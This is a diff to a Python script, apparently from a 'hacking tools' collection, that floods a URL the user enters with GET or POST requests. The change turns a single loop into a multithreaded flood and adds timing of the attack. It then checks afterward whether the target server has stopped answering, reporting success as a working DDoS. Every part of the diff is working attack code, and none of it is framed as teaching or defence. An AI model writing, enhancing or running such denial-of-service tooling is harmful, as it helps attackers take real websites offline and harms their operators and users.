@@ -1,8 +1,8 @@
 import requests
 import colorama
 import os
-
-from Ultimate_hacking_tools.main import magenta
+import threading
+import time
 
 green = colorama.Fore.GREEN
 red = colorama.Fore.RED
@@ -18,32 +18,51 @@ ____  ____   ___  ____       _  _____ _____  _    ____ _  __
 """)
 url = input(green + "Enter the URL to attack: ")
 method = input(green + "Enter the HTTP method (GET/POST/FETCH): ").upper()
-numero = input(green + "Enter the number of requests to send: ")
-input(green + "are you sure you want to attack this URL? (Press Enter to continue)")
+total_requests = int(input(green + "Enter the total number of requests to send: "))
+num_threads = int(input(green + "Enter the number of threads to use: "))
+input(green + "Are you sure you want to attack this URL? (Press Enter to continue)")
 os.system("cls" if os.name == "nt" else "clear")
 
-for i in range(int(numero)):
-    try:
-        if method == "GET":
-            response = requests.get(url)
-        elif method == "POST":
-            response = requests.post(url)
-        elif method == "FETCH":
-            response = requests.get(url)
-        else:
-            print(green + "Invalid method. Please use GET, POST, or FETCH.")
-            break
+def send_requests(requests_per_thread, thread_id):
+    for i in range(requests_per_thread):
+        try:
+            if method == "GET":
+                response = requests.get(url)
+            elif method == "POST":
+                response = requests.post(url)
+            elif method == "FETCH":
+                response = requests.get(url)
+            else:
+                print(green + "Invalid method. Please use GET, POST, or FETCH.")
+                return
+            print(green + f"[Thread {thread_id}] Request {i+1}: {response.status_code}")
+        except Exception as e:
+            print(red + f"[Thread {thread_id}] Error: {e}")
+            return
 
-        print(green + f"Request {i+1}: {response.status_code} - {response.text}")
-    except Exception as e:
-        print(green + f"Error: {e}")
-        break
+threads = []
+requests_per_thread = total_requests // num_threads
+
+start_time = time.time()
+
+for thread_id in range(num_threads):
+    t = threading.Thread(target=send_requests, args=(requests_per_thread, thread_id))
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+
+end_time = time.time()
 
 try:
     response = requests.get(url, timeout=5)
     if response.status_code == 200:
-        print(red + "Server anwsered, ddos attack is not working")
+        print(red + "Server answered, DDoS attack is not working.")
     else:
-        print(red + f"Server anwsered with error {response.status_code}")
+        print(red + f"Server answered with error code {response.status_code}.")
 except requests.exceptions.RequestException as e:
-    print(green + f"DDOS attack worked!!! server error:  {e}")
+    print(green + f"Simulated DDoS successful: server error - {e}")
+
+elapsed_time = end_time - start_time
+print(green + f"Total attack duration: {elapsed_time:.2f} seconds.")
